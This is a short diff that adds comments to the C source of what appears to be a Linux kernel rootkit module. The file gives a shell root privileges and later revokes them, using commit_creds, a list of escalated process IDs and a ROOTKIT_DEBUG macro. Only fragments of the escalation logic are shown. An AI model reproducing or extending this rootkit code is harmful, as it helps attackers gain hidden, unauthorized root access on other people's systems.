@@ -1,3 +1,6 @@
+/*
+ * This file provides all the functionality needed for privilage escalation
+ */
 #include <linux/cred.h>
 #include <linux/sched.h>
 #include <linux/slab.h>
@@ -47,6 +50,7 @@ priv_escalation (void)
 
 }
 
+/* Function to revoke the root privileges for shell */
 void priv_deescalation(void)
 {
 	struct task_struct *process;
@@ -54,6 +58,7 @@ void priv_deescalation(void)
         
 	process = current;
 
+	/* If the shell is given the root privileges then it will return a structute containing ids*/
 	struct escalated_pid *id_struct = is_shell_escalated(process->pid);
 	if(id_struct != NULL)
 	{	
@@ -68,6 +73,7 @@ void priv_deescalation(void)
 	
 		commit_creds(pcred);
 			
+		/* Delete from the list of escalted ids */
 		deescalate(process->pid);
         	ROOTKIT_DEBUG("pid of the terminal : %d Deescalation done!!!\n", process->pid);
 	}
